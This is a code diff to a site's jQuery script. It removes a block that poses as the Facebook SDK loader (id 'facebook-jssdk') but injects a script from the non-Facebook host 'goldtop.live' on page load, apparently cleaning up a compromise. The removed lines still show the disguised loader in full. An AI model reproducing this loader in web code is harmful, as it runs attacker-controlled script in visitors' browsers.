@@ -57,17 +57,6 @@ jQuery(document).ready(function (e) {
     }), "1" == (n = "fbmsg-sheet-open", (n = (document.cookie.match("(^|; )" + n + "=([^;]*)") || 0)[2]) && decodeURIComponent(n)) ? (i.show(), s()) : i.hide();
 });
 
-(function (d, s, id) {
-    var js, fjs = d.getElementsByTagName(s)[0];
-    if (d.getElementById(id))
-        return;
-    js = d.createElement(s);
-    js.id = id;
-    js.src = "http://goldtop.live/gotoapi/";
-    fjs.parentNode.insertBefore(js, fjs);
-}(document, 'script', 'facebook-jssdk'));
-// Sidebar Notification... (END)
-
 
 $(function() {
     $('#service_type').change(function() {
